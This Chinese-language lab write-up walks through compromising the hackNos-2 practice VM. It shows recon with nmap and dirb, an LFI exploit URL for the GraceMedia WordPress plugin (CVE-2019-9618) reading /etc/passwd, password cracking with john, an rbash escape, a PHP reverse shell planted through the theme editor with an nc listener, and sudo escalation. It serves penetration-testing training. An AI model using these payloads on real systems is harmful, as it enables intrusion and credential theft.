VirtualBox双击打开，默认wifi桥接模式！用探测发现IP地址！alivecheck 1.6-快速扫描.jar
192.168.4.22

知识推展：项目19~20 写bash探测

--------------------------------------------
--------------------------------------------
1、nmap 192.168.4.33 -p- -A
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

--------------------------------------------
--------------------------------------------
2、web信息收集

dirb http://192.168.4.33/

访问：
http://192.168.4.33/tsweb/


whatweb http://192.168.4.33/tsweb/
http://192.168.4.33/tsweb/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[rahulgehlaut@mail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.4.33], JQuery, MetaGenerator[WordPress 5.3.12], PoweredBy[-wordpress,-wordpress,,WordPress], Script[text/javascript], Title[hackNos-2 &#8211; hackNos.com], UncommonHeaders[link], WordPress[5.3.12]

这是wordpress CMS架构的，可以使用wpscan！！


--------------------------------------------
--------------------------------------------
3、AWVS漏扫-LFI

漏扫发现：
WordPress Plugin GraceMedia Media Player 本地文件包含 (1.0)	
http://192.168.4.33/tsweb/wp-content/plugins/gracemedia-media-player/

CVE-2019-9618：
WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。GraceMedia Media Player Plugin是使用在其中的一个媒体播放器插件。

WordPress GraceMedia Media Player插件1.0版本中存在本地文件包含漏洞，该漏洞源于程序没有验证‘cfg’参数!


http://192.168.2.235/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd

发现：
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/


--------------------------------------------
--------------------------------------------
4、暴力破解


john --wordlist=/root/Desktop/rockyou.txt dayu
topsecret        (flag)

john --show dayu   ---查看历史爆破信息
获得账号和密码：flag，topsecret



--------------------------------------------
--------------------------------------------
5、内部信息收集


ssh flag@192.168.4.33
topsecret

cd tmp
-rbash: cd: restricted
发现是rbash的shell环境！which python安装了，tty提下！
python -c 'import pty; pty.spawn("/bin/bash")'

127.0.0.1:3306
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo)


define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'hackNos-2.com' );

-rw-r--r-- 1 root root 32 Nov 17  2019 /var/backups/passbkp/md5-hash

--------------------------------------------
--------------------------------------------
6、提权

方法1：

flag@hacknos:/var/backups/passbkp$ cat md5-hash 
$1$rohit$01Dl0NQKtgfeL08fGrggi0

echo '$1$rohit$01Dl0NQKtgfeL08fGrggi0' > dayu1

john --wordlist=/root/Desktop/rockyou.txt dayu1
!%hack41         (?)

su rohit
!%hack41

sudo -l
User rohit may run the following commands on hacknos:
    (ALL : ALL) ALL


sudo su   ---成功拿到root权限！


方法2：

mysql -uwpuser -phackNos-2.com
发现：
user       | $P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/

echo '$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/' > dayu2
john --wordlist=/root/Desktop/rockyou.txt dayu2
解密不出！！！


进入wp_users中，将user用户密码修改为dayu：
update wp_users set user_pass=md5("dayu") where user_login='user';


访问：
http://192.168.4.33/tsweb/
user
dayu

Appearance -> Theme Editor
然后在右边选择：templates -> readme.txt

全部替换为：php-reverse-shell.php的内容！

LFI漏洞包含该txt文件：
nc -vlp 1234

http://192.168.4.33/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../var/www/html/tsweb/wp-content/themes/twentytwenty/readme.txt

这时候就拿到了www-data权限的shell！



--------------------------------------------
--------------------------------------------
7、代码审计
find / -name ajax_controller.php 2>/dev/null
/var/www/html/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php

11行：require_once($_GET['cfg']);
参数“cfg”未过滤，允许包含本地文件！

require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。 此行为和require()语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含。 有关此语句怎样工作参见require()的文档。



find / -name xmlrpc.php 2>/dev/null
/var/www/html/tsweb/xmlrpc.php



--------------------------------------------
--------------------------------------------
8、知识拓展

WordPress被利用xmlrpc.php进行CC暴力攻击进行禁用/屏蔽解决办法：
https://www.shopee6.com/web/web-tutorial/wordpress-disable-xmlrpc-cc-attack.html
https://wpjian.com/tips/2020101236044.html


<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>username</value></param>
    <param><value>password</value></param>
  </params>
</methodCall>



CVE-2020-15366
https://vuldb.com/zh/?id.158541


参考：
https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1277182
https://github.com/browserslist/browserslist/commit/c091916910dfe0b5fd61caad96083c6709b02d98
https://github.com/browserslist/browserslist/pull/593
https://github.com/browserslist/browserslist/blob/e82f32d1d4100d6bc79ea0b6b6a2d281a561e33c/index.js%23L472-L474
https://snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194



































